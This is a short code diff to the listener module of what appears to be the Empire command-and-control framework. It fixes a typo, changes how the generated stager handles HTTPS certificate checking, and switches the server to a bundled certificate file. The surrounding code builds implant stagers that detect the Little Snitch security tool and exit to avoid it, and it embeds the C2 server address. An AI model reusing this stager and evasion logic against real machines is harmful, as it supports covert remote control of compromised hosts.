@@ -252,7 +252,7 @@ class Listener:
                         launcherBase += "if re.search(\"Little Snitch\", out):\n"
                         launcherBase += "   sys.exit()\n"
                 except Exception as e:
-                    p = "[!] Error setting LittleSnitch in stagger: " + str(e)
+                    p = "[!] Error setting LittleSnitch in stager: " + str(e)
                     print helpers.color(p, color='red')
 
                 if userAgent.lower() == 'default':
@@ -564,7 +564,7 @@ class Listener:
                 updateServers = "server = '%s'\n"  % (listenerOptions['Host']['Value'])
 
                 if listenerOptions['Host']['Value'].startswith('https'):
-                    updateServers += "import ssl;if hasattr(ssl, '_create_unverified_context'):ssl._create_default_https_context = ssl._create_unverified_context;"
+                    updateServers += "hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None"
 
                 sendMessage = """
 def send_message(packets=None):
@@ -768,12 +768,8 @@ def send_message(packets=None):
             certPath = listenerOptions['CertPath']['Value']
             host = listenerOptions['Host']['Value']
             if certPath.strip() != '' and host.startswith('https'):
-                # if a certificate is specified create a SSL context
-                certPath = os.path.abspath(certPath)
-                app.run(host=bindIP, port=int(port), threaded=True, ssl_context=(certPath, certPath))
-            elif host.startswith('https'):
-                # signal the server to automatically generate one
-                app.run(host=bindIP, port=int(port), threaded=True, ssl_context='adhoc')
+                context = ("%s/data/empire.pem" % (self.mainMenu.installPath), "%s/data/empire.pem"  % (self.mainMenu.installPath))
+                app.run(host=bindIP, port=int(port), threaded=True, ssl_context=context)
             else:
                 app.run(host=bindIP, port=int(port), threaded=True)
 
